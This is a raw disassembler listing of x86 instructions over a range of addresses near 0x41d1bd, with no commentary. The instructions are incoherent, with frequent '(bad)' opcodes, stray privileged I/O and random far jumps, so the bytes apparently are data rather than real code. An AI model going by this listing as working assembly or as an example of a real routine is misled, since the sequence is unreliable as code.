  41d1bd:	cli    
  41d1be:	adc    esp,DWORD PTR [ebp-0x1eddf647]
  41d1c4:	in     eax,dx
  41d1c5:	add    DWORD PTR [esi-0xd3b120a],eax
  41d1cb:	sub    cl,cl
  41d1cd:	(bad)  
  41d1ce:	mov    eax,ds:0x7a9bd84d
  41d1d4:	cwde   
  41d1d5:	clc    
  41d1d6:	push   esp
  41d1d7:	jne    0x41d22c
  41d1d9:	iret   
  41d1da:	fld    TBYTE PTR [ebx-0x22]
  41d1dd:	pop    esp
  41d1de:	call   0x6e90:0x8250ec44
  41d1e5:	adc    eax,0xe90f76d5
  41d1ea:	add    eax,0x8daf771a
  41d1ef:	sub    BYTE PTR [ebx+0x4ba5f51c],dh
  41d1f5:	xor    al,0xe4
  41d1f7:	inc    esp
  41d1f8:	js     0x41d1af
  41d1fa:	pop    edx
  41d1fb:	mov    gs:0xc4b4b6be,al
  41d201:	gs mov ah,0xb0
  41d204:	mov    ah,0x16
  41d206:	loop   0x41d229
  41d208:	mov    dl,0x22
  41d20a:	adc    al,0x43
  41d20c:	sar    BYTE PTR [esi+0x558c288],0x3e
  41d213:	mov    bh,0xac
  41d215:	mov    WORD PTR [ecx-0x5a],ds
  41d218:	jnp    0x41d1f3
  41d21a:	mov    ds:0x41f08697,eax
  41d21f:	mov    ebp,0xd53e71c4
  41d224:	lods   eax,DWORD PTR ds:[esi]
  41d225:	out    dx,al
  41d226:	mov    bl,0x11
  41d228:	xchg   ecx,eax
  41d229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d22a:	retf   0x1b20
  41d22d:	out    0x80,al
  41d22f:	outs   dx,DWORD PTR ds:[esi]
  41d230:	jl     0x41d277
  41d232:	aaa    
  41d233:	les    edi,FWORD PTR [edx+0x7e]
  41d236:	sub    eax,0xcaf6edda
  41d23b:	shr    DWORD PTR [esi-0x3a],0x9d
  41d23f:	ins    DWORD PTR es:[edi],dx
  41d240:	mov    eax,ds:0x522fa785
  41d245:	pop    ecx
  41d246:	add    al,bh
  41d248:	retf   
  41d249:	aaa    
  41d24a:	daa    
  41d24b:	mov    ecx,0xf174e111
  41d250:	jb     0x41d249
  41d252:	push   es
  41d253:	inc    ebp
  41d254:	loop   0x41d242
  41d256:	shl    DWORD PTR [ebp-0x75152b18],0xe1
  41d25d:	sub    eax,0x6c1ad925
  41d262:	and    edi,DWORD PTR [edx]
  41d264:	mov    esi,0x5267643a
  41d269:	data16 js 0x41d251
  41d26c:	mov    dl,0xef
  41d26e:	push   ecx
  41d26f:	add    BYTE PTR [ecx+eax*1],ch
  41d272:	out    0x95,eax
  41d274:	xor    al,0x15
  41d277:	lods   eax,DWORD PTR ds:[esi]
  41d278:	inc    edi
  41d279:	add    DWORD PTR [ebx],edx
  41d27b:	repz or BYTE PTR [edx],bh
  41d27e:	xor    BYTE PTR [ebx-0x64],0x2a
  41d282:	scas   al,BYTE PTR es:[edi]
  41d283:	xchg   BYTE PTR [edi+0x6d],dh
  41d286:	out    dx,al
  41d287:	ret    
  41d288:	dec    edi
  41d289:	lock adc esi,edi
  41d28c:	sub    eax,0x430f9ac6
  41d291:	push   cs
  41d292:	mov    eax,0xcad852d7
  41d297:	adc    dl,dh
  41d299:	fs sbb ebx,ecx
  41d29c:	stos   BYTE PTR es:[edi],al
  41d29d:	(bad)  [esi+edi*8+0x710db170]
  41d2a4:	push   ss
  41d2a5:	cmp    al,0xcb
  41d2a7:	in     al,0x6
  41d2a9:	add    eax,0x43aee796
  41d2ae:	pop    eax
  41d2af:	push   ebp
  41d2b0:	mov    ah,0xf1
  41d2b2:	sahf   
  41d2b3:	jbe    0x41d2d7
  41d2b5:	xor    edi,DWORD PTR [ecx+esi*8]
  41d2b8:	stos   BYTE PTR es:[edi],al
  41d2b9:	fild   DWORD PTR [ecx+edx*1+0x62]
  41d2bd:	xchg   ebp,eax
  41d2be:	mov    DWORD PTR [eax],ebx
  41d2c0:	jle    0x41d2b8
  41d2c2:	sti    
  41d2c3:	pop    ds
  41d2c4:	mov    eax,0xc89d07e8
  41d2c9:	push   cs
  41d2ca:	loopne 0x41d2f7
  41d2cc:	add    DWORD PTR [edi+0x10],ecx
  41d2cf:	cmp    ecx,DWORD PTR [eax]
  41d2d1:	mov    bl,0xdc
  41d2d3:	xor    cl,BYTE PTR [edi*8+0x375bf8c2]
  41d2da:	push   ecx
  41d2db:	adc    al,0x3e
  41d2dd:	inc    eax
  41d2de:	das    
  41d2df:	xchg   ecx,eax
  41d2e0:	or     eax,0x4edc68e
  41d2e5:	add    ebp,edi
  41d2e7:	fistp  WORD PTR [esi-0x24]
  41d2ea:	inc    edx
  41d2eb:	loop   0x41d33d
  41d2ed:	or     BYTE PTR [edx+eax*1],al
  41d2f0:	adc    esi,DWORD PTR [ebx]
  41d2f2:	repnz outs dx,DWORD PTR ds:[esi]
  41d2f4:	xor    BYTE PTR [edx+ebx*2+0x38ec330a],ch
  41d2fb:	fcom   DWORD PTR [eax-0x3db27882]
  41d301:	sbb    al,0x9e
  41d303:	sbb    esi,DWORD PTR [ebp-0x31]
  41d306:	mov    esp,0x8715200e
  41d30b:	jge    0x41d338
  41d30d:	scas   eax,DWORD PTR es:[edi]
  41d30e:	dec    ebp
  41d30f:	and    al,0x5
  41d311:	gs xchg esp,eax
  41d313:	push   cs
  41d314:	pop    edi
  41d315:	mov    ecx,0x2213a4f2
  41d31a:	push   es
  41d31b:	cld    
  41d31c:	call   0x35c7:0x8ab321c
  41d323:	sbb    al,0xf5
  41d325:	sub    edi,DWORD PTR [esi+0x4366c50f]
  41d32b:	jbe    0x41d2e7
  41d32d:	cmp    BYTE PTR [ebx-0x45],dl
  41d330:	fiadd  WORD PTR [edi-0x434cfb25]
  41d336:	mov    al,0x1b
  41d338:	ret    
  41d339:	test   DWORD PTR [ebx+0xfba6507],esi
  41d33f:	inc    edi
  41d340:	lock out 0x7c,eax
  41d343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d344:	loopne 0x41d394
  41d346:	add    ah,dl
  41d348:	jl     0x41d302
  41d34a:	sub    DWORD PTR [eax-0x62],ecx
  41d34d:	(bad)  
  41d34e:	out    dx,al
  41d34f:	cwde   
  41d350:	loopne 0x41d2dc
  41d352:	add    al,0x30
  41d354:	mov    al,0xb1
  41d356:	jmp    0x9763:0x6dd7e942
  41d35d:	jmp    0x4955ad4
  41d362:	pop    ss
  41d363:	test   DWORD PTR [esi+0x6c],0xdf61068
  41d36a:	ja     0x41d3a1
  41d36c:	adc    eax,0xf476c42a
  41d371:	fmul   st(6),st
  41d373:	enter  0xf4b7,0x7f
  41d377:	jecxz  0x41d33a
  41d379:	aaa    
  41d37a:	inc    ecx
  41d37b:	enter  0x23d2,0x7c
  41d37f:	(bad)
  41d382:	rcl    BYTE PTR [eax+0x57e833e],1
  41d388:	cmp    BYTE PTR [edx-0xa],cl
  41d38b:	sti    
  41d38c:	mov    ch,0xa6
  41d38e:	mov    bh,0x3
  41d390:	add    BYTE PTR [edx],al
  41d392:	hlt    
  41d393:	adc    eax,0x3c37fbe2
  41d398:	sub    dh,BYTE PTR [ebx-0x2ab3086f]
  41d39e:	(bad)  
  41d3a0:	rcl    edx,1
  41d3a2:	jle    0x41d3ad
  41d3a4:	mov    cl,0xaf
  41d3a6:	or     bl,BYTE PTR [eax]
  41d3a8:	mov    edi,0x667b7c2c
  41d3ad:	dec    ebx
  41d3ae:	leave  
  41d3af:	push   ebp
  41d3b0:	sbb    al,0x2e
  41d3b2:	out    dx,al
  41d3b3:	cwde   
  41d3b4:	push   ss
  41d3b5:	es (bad) 
  41d3b7:	inc    cl
  41d3b9:	lods   al,BYTE PTR es:[esi]
  41d3bb:	jge    0x41d358
  41d3bd:	inc    ebx
  41d3be:	jo     0x41d3fb
  41d3c0:	retf   0x6bc9
  41d3c3:	out    0x3d,eax
  41d3c5:	mov    ah,0x29
  41d3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c8:	call   0x3fdf:0xa0e514b4
  41d3cf:	push   eax
  41d3d0:	not    esi
  41d3d2:	jmp    0x41d3a9
  41d3d4:	add    DWORD PTR [esi+0x62cb90aa],ebx
  41d3da:	jns    0x41d451
  41d3dc:	pop    ss
  41d3dd:	das    
  41d3de:	mov    dh,0x64
  41d3e0:	bound  ebp,QWORD PTR [esi+0x15366430]
  41d3e6:	and    DWORD PTR ds:0xf368c8c9,ebx
  41d3ec:	mov    dl,0x3c
  41d3ee:	cmp    DWORD PTR [esi],0x65
  41d3f1:	or     al,0xde
  41d3f3:	test   ebp,esp
  41d3f5:	es lock sbb cl,bh
  41d3f9:	dec    edx
  41d3fa:	dec    ebx
  41d3fb:	push   ebx
  41d3fc:	jg     0x41d3d6
  41d3fe:	push   0x6e3647ea
  41d403:	pop    es
  41d404:	xchg   ebx,eax
  41d405:	and    eax,0x49cbf6f1
  41d40a:	cmp    al,BYTE PTR [eax-0x1f851c2c]
  41d410:	enter  0xdf14,0x7e
  41d414:	lea    ecx,[ebx-0x5c]
  41d417:	out    dx,eax
  41d418:	adc    ebx,eax
  41d41a:	and    ebx,DWORD PTR [ebx*2-0xe85147c]
  41d421:	cwde   
  41d422:	add    edx,0xffffffbe
  41d425:	jmp    0x99ed:0x24454844
  41d42c:	subps  xmm6,XMMWORD PTR [eax+0xf]
  41d430:	imul   esi,edx,0x5e
  41d433:	mov    DWORD PTR [edx-0x72],edi
  41d436:	jb     0x41d49c
  41d438:	pusha  
  41d439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d43a:	jecxz  0x41d3f9
  41d43c:	sub    DWORD PTR [ebx],ecx
  41d43e:	jmp    0x31cd6e23
  41d443:	loopne 0x41d45f
  41d445:	(bad)  
  41d447:	xchg   DWORD PTR [ebx+0x7],esi
  41d44a:	aaa    
  41d44b:	loop   0x41d420
  41d44d:	pop    es
  41d44e:	push   ebp
  41d44f:	mov    eax,ds:0x56cc563b
  41d454:	sub    bh,al
  41d456:	push   esi
  41d457:	add    DWORD PTR ds:0x5378cdba,ecx
  41d45d:	(bad)  
  41d45e:	mov    dh,0xb6
  41d460:	imul   ebp,DWORD PTR [esi],0xffffffb2
  41d463:	and    esi,DWORD PTR [ebx-0x7]
  41d466:	mov    al,0x1
  41d468:	aaa    
  41d469:	pop    edx
  41d46a:	inc    ebx
  41d46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d46c:	push   ds
  41d46d:	cmp    ch,BYTE PTR [ebx-0x45b4f154]
  41d473:	rcr    DWORD PTR [edx],cl
  41d475:	xchg   esi,eax
  41d476:	outs   dx,BYTE PTR ds:[esi]
  41d477:	jmp    0x23b2:0x2410ec56
  41d47e:	scas   eax,DWORD PTR es:[edi]
  41d47f:	inc    ebx
  41d480:	mov    esi,0xb4ae107e
  41d485:	push   edi
  41d486:	aad    0x6b
  41d488:	pop    esp
  41d489:	inc    edx
  41d48a:	enter  0x340a,0x64
  41d48e:	mov    BYTE PTR [eax-0x55153771],al
  41d494:	sub    eax,0xf8b1ee99
  41d499:	push   edx
  41d49a:	add    eax,0x78a39849
  41d49f:	enter  0x84f9,0x3d
  41d4a3:	pop    ds
  41d4a4:	mov    al,ds:0x76d232e4
  41d4a9:	fsubr  QWORD PTR [eax+0xf]
  41d4ac:	mov    bh,0x7e
  41d4ae:	adc    al,BYTE PTR [ecx+eax*2]
  41d4b1:	adc    al,0xf0
  41d4b3:	mov    ebp,0x157efde9
  41d4b8:	cmp    BYTE PTR [ebp-0x44da016e],dh
  41d4be:	fild   DWORD PTR [ecx-0x50]
  41d4c1:	aaa    
  41d4c2:	jbe    0x41d498
  41d4c4:	(bad)  
  41d4c5:	fisubr DWORD PTR [ecx-0x55866779]
  41d4cb:	mov    ?,WORD PTR [edi+0x60]
  41d4ce:	mov    al,ds:0xa8627528
  41d4d3:	xchg   edx,eax
  41d4d4:	ss jl  0x41d4d1
  41d4d7:	loop   0x41d4d4
  41d4d9:	sub    esi,DWORD PTR [ebp-0x68757c04]
  41d4df:	pop    ebx
  41d4e0:	hlt    
  41d4e1:	push   es
  41d4e2:	fs pop edx
  41d4e4:	or     BYTE PTR [eax-0x20dd334d],ah
  41d4ea:	test   eax,0xd26faa27
  41d4ef:	push   edx
  41d4f0:	rcr    BYTE PTR [esi+0x29635fe0],1
  41d4f6:	push   edx
  41d4f7:	iret   
  41d4f8:	icebp  
  41d4f9:	xor    dh,BYTE PTR [ebx+0x13d930a7]
  41d4ff:	sbb    eax,0x7abd78ca
  41d504:	sar    DWORD PTR [esi],1
  41d506:	dec    eax
  41d507:	outs   dx,BYTE PTR fs:[esi]
  41d509:	add    ch,BYTE PTR [ecx+0x4d]
  41d50c:	inc    ebp
  41d50d:	xchg   BYTE PTR [ecx],bl
  41d50f:	xchg   ebx,eax
  41d510:	push   cs
  41d511:	pop    edx
  41d512:	aas    
  41d513:	push   edi
  41d514:	inc    edi
  41d515:	mov    eax,DWORD PTR [ebp+0x5a]
  41d518:	sbb    eax,0x4b1cfc7e
  41d51d:	sub    bl,ah
  41d51f:	or     ch,BYTE PTR [eax]
  41d521:	push   ebx
  41d522:	scas   eax,DWORD PTR es:[edi]
  41d523:	jb     0x41d50f
  41d525:	nop
  41d526:	lahf   
  41d527:	mov    ch,0xa8
  41d529:	xor    eax,0xce58f07
  41d52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d52f:	fmulp  st(3),st
  41d531:	hlt    
  41d532:	stc    
  41d533:	lahf   
  41d534:	or     eax,0xab2783ac
  41d539:	(bad)
  41d53c:	scas   al,BYTE PTR es:[edi]
  41d53d:	loopne 0x41d58a
  41d53f:	pop    ebp
  41d540:	loope  0x41d552
  41d542:	or     cl,0xb1
  41d545:	mov    dh,BYTE PTR [ebx-0x2eb6fc47]
  41d54b:	jb     0x41d5c8
  41d54d:	rol    esi,0xe1
  41d550:	xor    al,0xf1
  41d552:	leave  
  41d553:	nop
  41d554:	mov    ebp,ds
  41d556:	xor    al,BYTE PTR [ecx]
  41d558:	fisubr DWORD PTR [edi+0x743313e2]
  41d55e:	aas    
  41d55f:	(bad)  
  41d560:	and    esi,DWORD PTR [esi]
  41d562:	mov    ecx,0x1f3d2277
  41d567:	mov    al,ds:0x722256c4
  41d56c:	pop    eax
  41d56d:	jne    0x41d4fc
  41d56f:	test   DWORD PTR [esi+eax*1-0x51b753cd],esi
  41d576:	pop    ss
  41d577:	mov    eax,0xd1531354
  41d57c:	shl    BYTE PTR [edx+0x11],1
  41d57f:	sbb    ebx,edx
  41d581:	inc    edi
  41d582:	test   BYTE PTR [edi],0x72
  41d585:	fcomp  DWORD PTR [ebp+0x48]
  41d588:	aaa    
  41d589:	push   0x92c252dc
  41d58e:	inc    ebp
  41d58f:	cld    
  41d590:	lock iret 
  41d592:	adc    BYTE PTR [esi-0x68],dh
  41d595:	inc    ebx
  41d596:	shl    DWORD PTR [edx+0x9da2609],0x61
  41d59d:	cmp    edi,DWORD PTR [ebp+0x1b298872]
  41d5a3:	data16 fmul QWORD PTR [ebp+ecx*4+0x49]
  41d5a8:	or     eax,0xe92f6a4b
  41d5ad:	(bad)  
  41d5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5af:	mov    ds:0x4b07a48,al
  41d5b4:	fidiv  WORD PTR [esi+0x20]
  41d5b7:	adc    ebx,DWORD PTR [edi-0x26]
  41d5ba:	(bad)  
  41d5bb:	into   
  41d5bc:	in     eax,0x76
  41d5be:	sub    cl,BYTE PTR gs:[esi-0x79]
  41d5c2:	leave  
  41d5c3:	retf   0xbf1f
  41d5c6:	adc    DWORD PTR [ebp+0x1b],0x21
  41d5ca:	sbb    BYTE PTR ds:[eax+esi*8+0x55],dh
  41d5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5d0:	and    bh,BYTE PTR [ebp+0xad827ff]
  41d5d6:	cwde   
  41d5d7:	arpl   sp,dx
  41d5d9:	or     ecx,ecx
  41d5db:	test   DWORD PTR [esi],0x624c0090
  41d5e1:	mov    cl,0xfc
  41d5e3:	pop    ebx
  41d5e4:	in     al,dx
  41d5e5:	xchg   DWORD PTR [ebx+0x5],edi
  41d5e8:	mov    ah,0x3f
  41d5ea:	cdq    
  41d5eb:	mov    ds:0x3a80859e,al
  41d5f0:	inc    edx
  41d5f1:	xchg   dh,cl
  41d5f3:	fucom  st(4)
  41d5f5:	sub    eax,DWORD PTR [eax]
  41d5f7:	jmp    0x903c63c1
  41d5fc:	add    eax,DWORD PTR [ebx]
  41d5fe:	add    BYTE PTR [esp+esi*1+0x7b4adbe9],0x31
  41d606:	sub    BYTE PTR [eax+0x2a6454c8],0xe1
  41d60d:	scas   al,BYTE PTR es:[edi]
  41d60e:	scas   eax,DWORD PTR es:[edi]
  41d60f:	out    0x54,eax
  41d611:	clc    
  41d612:	(bad)  
  41d613:	mov    edx,0xd3dcf6c2
  41d618:	mov    DWORD PTR [ebx],0x9ae28770
  41d61e:	cs mov bh,0xb2
  41d621:	xor    al,0x4e
  41d623:	adc    edx,DWORD PTR [ebx-0x79]
  41d626:	xchg   edi,eax
  41d627:	and    esp,DWORD PTR [edi-0x45]
  41d62a:	jle    0x41d5c5
  41d62c:	pop    edx
  41d62d:	pop    esi
  41d62e:	mov    dh,cl
  41d630:	scas   eax,DWORD PTR es:[edi]
  41d631:	ror    DWORD PTR [eax+edx*4],1
  41d634:	cdq    
  41d635:	aam    0x47
  41d637:	adc    eax,0x4d2fde38
  41d63c:	out    0xe3,eax
  41d63e:	in     eax,dx
  41d63f:	into   
  41d640:	jno    0x41d66b
  41d642:	cdq    
  41d643:	sbb    eax,0x3e713cbd
  41d648:	add    eax,0xca088dea
  41d64d:	jnp    0x41d647
  41d64f:	jns    0x41d6b3
  41d651:	inc    esi
  41d652:	cli    
  41d653:	ins    BYTE PTR es:[edi],dx
  41d654:	jns    0x41d634
  41d656:	shr    BYTE PTR [ecx],0xe7
  41d659:	adc    ah,dh
  41d65b:	mov    eax,0x264b6231
  41d660:	aaa    
  41d661:	in     eax,dx
  41d662:	(bad)  
  41d663:	mov    dh,0xf4
  41d665:	jns    0x41d672
  41d667:	jl     0x41d621
  41d669:	fstp   TBYTE PTR [edi]
  41d66b:	les    edi,FWORD PTR [eax+0x364f7aa0]
  41d671:	sbb    ecx,DWORD PTR [eax+0x60d4f262]
  41d677:	and    ch,cl
  41d679:	mov    eax,ds:0x8513e616
  41d67e:	in     eax,0x24
  41d680:	jge    0x41d60f
  41d682:	mov    ah,0x9f
  41d684:	out    dx,al
  41d685:	imul   ebx,esp,0xffffffe1
  41d688:	popa   
  41d689:	fwait
  41d68a:	pop    ss
  41d68b:	cs call 0x259a:0x223c08bf
  41d693:	dec    esp
  41d694:	mov    eax,0x39a87206
  41d699:	(bad)  
  41d69a:	pop    ebx
  41d69b:	xor    eax,0xf1b56ea0
  41d6a0:	cmp    esi,DWORD PTR [edx-0x25]
  41d6a3:	scas   eax,DWORD PTR es:[edi]
  41d6a4:	imul   edi,eax,0x8606cac7
  41d6aa:	cwde   
  41d6ab:	fisub  DWORD PTR [eax]
  41d6ad:	ja     0x41d6cc
  41d6af:	pop    edi
  41d6b0:	or     eax,DWORD PTR [ebp-0x3e]
  41d6b3:	mov    edx,0xc45879b6
  41d6b8:	adc    DWORD PTR [eax],esi
  41d6ba:	inc    esi
  41d6bb:	das    
  41d6bc:	js     0x41d662
  41d6be:	inc    ebx
  41d6bf:	lock aas 
  41d6c1:	mov    al,ds:0xb1446013
  41d6c6:	stos   BYTE PTR es:[edi],al
  41d6c7:	imul   eax,DWORD PTR [ecx-0x24f02a1e],0x160089f9
  41d6d1:	pop    edi
  41d6d2:	mov    bh,0x31
  41d6d4:	cmp    cl,dh
  41d6d6:	mov    bh,BYTE PTR [edi+0xa]
  41d6d9:	cmp    eax,0x7680975e
  41d6de:	sbb    ecx,DWORD PTR [eax+0xc]
  41d6e1:	jns    0x41d6dd
  41d6e3:	aam    0xb
  41d6e5:	push   edi
  41d6e6:	push   esi
  41d6e7:	sub    BYTE PTR [ecx+ebx*8-0x657acf05],ch
  41d6ee:	and    DWORD PTR [edx+ecx*2],ecx
  41d6f1:	clc    
  41d6f2:	es dec ecx
  41d6f4:	pop    esp
  41d6f5:	ret    
  41d6f6:	and    esp,edx
  41d6f8:	or     eax,0xfaf9d62e
  41d6fd:	fimul  DWORD PTR [edi]
  41d6ff:	cmp    dh,BYTE PTR [edi-0x52]
  41d702:	mov    es,WORD PTR [ebx+0x10bb755f]
  41d708:	shl    BYTE PTR [ecx+0x45d0c419],0x66
  41d70f:	pop    ecx
  41d710:	repz fcmovnu st,st(6)
  41d713:	xor    ebx,DWORD PTR [esi+edx*1]
  41d716:	xor    bl,BYTE PTR [esi-0x6b48c4a7]
  41d71c:	mov    ch,0x3b
  41d71e:	inc    ecx
  41d71f:	add    BYTE PTR [edx+0x2c05da60],ch
  41d725:	jmp    0x42f8:0x7cc0c608
  41d72c:	mov    edi,0x50a651e5
  41d731:	sub    al,0x1a
  41d733:	ja     0x41d762
  41d735:	stos   BYTE PTR es:[edi],al
  41d736:	mov    ah,0x62
  41d738:	inc    ebp
  41d739:	mov    al,0xe5
  41d73b:	add    al,0x26
  41d73d:	add    ah,BYTE PTR [ebx-0x41a48cc6]
  41d743:	push   ebp
  41d744:	mov    WORD PTR [esi+0x5d],ds
  41d747:	mov    ds:0xa8d634ff,al
  41d74c:	(bad)  
  41d74d:	push   eax
  41d74e:	pop    es
  41d74f:	test   BYTE PTR [ecx+0x17],ah
  41d752:	dec    edi
  41d753:	mov    bh,0xa0
  41d755:	pop    edi
  41d756:	xchg   esi,eax
  41d757:	and    al,0x55
  41d759:	mov    eax,DWORD PTR [edi-0x4824f583]
  41d75f:	push   0x264efdf4
  41d764:	cdq    
  41d765:	lds    ecx,FWORD PTR [eax]
  41d767:	cs fwait
  41d769:	cli    
  41d76a:	mov    ds:0x91743232,eax
  41d76f:	enter  0xb972,0x1a
  41d773:	nop
  41d774:	mov    WORD PTR fs:[esi+0x578a83c5],cs
  41d77b:	jp     0x41d7e8
  41d77d:	out    0x16,eax
  41d77f:	test   al,0xbf
  41d781:	jae    0x41d7f6
  41d783:	ret    
  41d784:	das    
  41d785:	jl     0x41d70e
  41d787:	jmp    0x41d777
  41d789:	mov    ch,BYTE PTR [ecx]
  41d78b:	and    esp,esp
  41d78d:	test   BYTE PTR [esi-0xb06a659],bh
  41d793:	jne    0x41d755
  41d795:	sub    al,0x7f
  41d797:	ins    BYTE PTR es:[edi],dx
  41d798:	popa   
  41d799:	sub    esi,DWORD PTR [ecx-0x27]
  41d79c:	dec    ebx
  41d79d:	xlat   BYTE PTR ds:[ebx]
  41d79e:	int3   
  41d79f:	pop    edx
  41d7a0:	loope  0x41d74c
  41d7a2:	data16 sar al,0x3b
  41d7a6:	push   ss
  41d7a7:	dec    ecx
  41d7a8:	lds    esi,FWORD PTR [esi-0xc2e8054]
  41d7ae:	adc    edx,edx
  41d7b0:	xor    BYTE PTR cs:[edx],bl
  41d7b3:	jo     0x41d751
  41d7b5:	lahf   
  41d7b6:	enter  0x867f,0x7f
  41d7ba:	test   DWORD PTR [edx+0x1856bc83],0x9c2e3ae6
  41d7c4:	sti    
  41d7c5:	arpl   WORD PTR [edi+0x5f2513be],dx
  41d7cb:	inc    ebx
  41d7cc:	lock adc al,BYTE PTR [ebx+0x77545621]
  41d7d3:	mov    cl,BYTE PTR [ebp+0x35]
  41d7d6:	push   edx
  41d7d7:	loop   0x41d783
  41d7d9:	add    ecx,DWORD PTR [ecx+0x67016d8e]
  41d7df:	outs   dx,DWORD PTR ds:[esi]
  41d7e0:	xor    DWORD PTR [ebp+edi*4+0x6c],ecx
  41d7e4:	addr16 inc esi
  41d7e6:	sahf   
  41d7e7:	mov    edx,0x8ca829b1
  41d7ec:	popf   
  41d7ed:	xor    esi,0x34
  41d7f0:	in     eax,0x1f
  41d7f2:	cmp    dh,BYTE PTR [edi]
  41d7f4:	sbb    dh,BYTE PTR [ebx+0x1cb8dacb]
  41d7fa:	leave  
  41d7fb:	jmp    0xf4ca:0x51fb84b6
  41d802:	xchg   bh,dh
  41d804:	test   BYTE PTR [edx],cl
  41d806:	add    BYTE PTR [ecx],ah
  41d808:	leave  
  41d809:	add    eax,0x823ed8d2
  41d80e:	cli    
  41d80f:	dec    ebx
  41d810:	outs   dx,BYTE PTR ds:[esi]
  41d811:	in     eax,dx
  41d812:	sub    al,bl
  41d814:	inc    esi
  41d815:	jns    0x41d7f3
  41d817:	retf   
  41d818:	push   esp
  41d819:	mov    bl,0x63
  41d81b:	jl     0x41d825
  41d81d:	dec    ecx
  41d81e:	push   ecx
  41d81f:	and    ch,BYTE PTR [esi]
  41d821:	pusha  
  41d822:	in     eax,0x24
  41d824:	imul   ecx,DWORD PTR [eax+0x60],0x7f
  41d828:	and    esp,edi
  41d82a:	push   cs
  41d82b:	(bad)  
  41d82c:	adc    eax,0x93b9c8e7
  41d831:	fwait
  41d832:	mov    ecx,0x2b841808
  41d837:	mov    ebx,0xa43c2db5
  41d83c:	ins    DWORD PTR es:[edi],dx
  41d83d:	loop   0x41d895
  41d83f:	call   0x1af61473
  41d844:	mov    edx,0xec6f32ed
  41d849:	cmp    bh,al
  41d84b:	dec    ebx
  41d84c:	xor    ebp,DWORD PTR [edi+eiz*8]
  41d84f:	mov    ebp,0x74eeb710
  41d854:	sti    
  41d855:	loope  0x41d8a5
  41d857:	(bad)
  41d85a:	fs fmul st(7),st
  41d85d:	xchg   esi,eax
  41d85e:	pop    bx
  41d860:	out    dx,eax
  41d861:	fwait
  41d862:	or     DWORD PTR [eax],eax
  41d864:	sahf   
  41d865:	xchg   bh,cl
  41d867:	cli    
  41d868:	jle    0x41d81e
  41d86a:	mov    ?,WORD PTR [ebp*1-0x4d52128b]
  41d871:	jp     0x41d815
  41d873:	mov    esp,0x8e924673
  41d878:	fnstcw WORD PTR [esi+0xd]
  41d87b:	xor    BYTE PTR ss:0xfa462f2e,0xf3
  41d883:	xchg   esi,eax
  41d884:	scas   al,BYTE PTR es:[edi]
  41d885:	lock sar DWORD PTR [eax+eax*4],1
  41d889:	and    eax,0x6a9b3e02
  41d88e:	(bad)  
  41d88f:	and    al,0xdc
  41d891:	xchg   ecx,eax
  41d892:	daa    
  41d893:	addr16 loopne 0x41d872
  41d896:	push   esp
  41d897:	aaa    
  41d898:	cmc    
  41d899:	xchg   DWORD PTR [edi],ecx
  41d89b:	in     eax,0xf6
  41d89d:	dec    ebp
  41d89e:	pushf  
  41d89f:	xchg   ebp,eax
  41d8a0:	jmp    0xb501c157
  41d8a5:	retf   0x7559
  41d8a8:	sub    dh,BYTE PTR [ecx+0x41]
  41d8ab:	inc    esp
  41d8ac:	jno    0x41d895
  41d8ae:	pop    ecx
  41d8af:	dec    esi
  41d8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b1:	ret    
  41d8b2:	jae    0x41d867
  41d8b4:	(bad)  
  41d8b5:	(bad)  
  41d8b6:	mov    bl,0xc0
  41d8b8:	jae    0x41d8cb
  41d8ba:	mov    edx,0xb27301b
  41d8bf:	fcom   QWORD PTR [ebx]
  41d8c1:	jg     0x41d8c5
  41d8c3:	sahf   
  41d8c4:	hlt    
  41d8c5:	scas   al,BYTE PTR es:[edi]
  41d8c6:	mov    gs,edi
  41d8c8:	inc    edx
  41d8c9:	dec    ebp
  41d8ca:	or     eax,0x42610e0
  41d8cf:	jmp    0x2d8e:0xa2f216a6
  41d8d6:	(bad)  
  41d8d7:	mov    ebx,DWORD PTR [esi]
  41d8d9:	mov    eax,ds:0x35f5aafd
  41d8de:	pmullw mm6,mm1
  41d8e1:	cdq    
  41d8e2:	scas   eax,DWORD PTR es:[edi]
  41d8e3:	mov    WORD PTR [ebx+0x58edc5b8],ds
  41d8e9:	out    dx,al
  41d8ea:	add    BYTE PTR [edi],0x4d
  41d8ed:	retf   0xd93a
  41d8f0:	addr16 lock cli 
  41d8f3:	mov    bl,0xb8
  41d8f5:	dec    esi
  41d8f6:	and    BYTE PTR [eax+ecx*4-0x6625e57b],0xa4
  41d8fe:	push   ds
  41d8ff:	push   ss
  41d900:	mov    al,0x92
  41d902:	push   ss
  41d903:	outs   dx,DWORD PTR ds:[esi]
  41d904:	cli    
  41d905:	test   bh,dh
  41d907:	sub    BYTE PTR [ecx+0x23343493],cl
  41d90d:	mov    edx,0xad68bd51
  41d912:	push   edi
  41d913:	in     eax,dx
  41d914:	addr16 jo 0x41d977
  41d917:	pushf  
  41d918:	fst    QWORD PTR [edi+edx*1+0x14]
  41d91c:	xor    BYTE PTR [ecx+0x56010c38],dh
  41d922:	pop    es
  41d923:	aaa    
  41d924:	xchg   edi,eax
  41d925:	fs (bad) 
  41d927:	xchg   ebx,eax
  41d928:	sbb    bh,ah
  41d92a:	stos   DWORD PTR es:[edi],eax
  41d92b:	loope  0x41d8d9
  41d92d:	xor    eax,0x9dcf9ce
  41d932:	std    
  41d933:	pop    edx
  41d934:	jae    0x41d99b
  41d936:	or     eax,0xf8d1227b
  41d93b:	jo     0x41d8bd
  41d93d:	xor    eax,0x2b47b528
  41d942:	icebp  
  41d943:	cmp    eax,0x7f2e79a
  41d948:	add    DWORD PTR [esi],ecx
  41d94a:	stos   DWORD PTR es:[edi],eax
  41d94b:	xchg   ecx,eax
  41d94c:	out    0x45,al
  41d94e:	rep lods al,BYTE PTR ds:[esi]
  41d950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d951:	call   0x261d:0x2ae028fa
  41d958:	into   
  41d959:	mov    ds:0xa5f51981,eax
  41d95e:	or     eax,0x4ebcc217
  41d963:	(bad)  
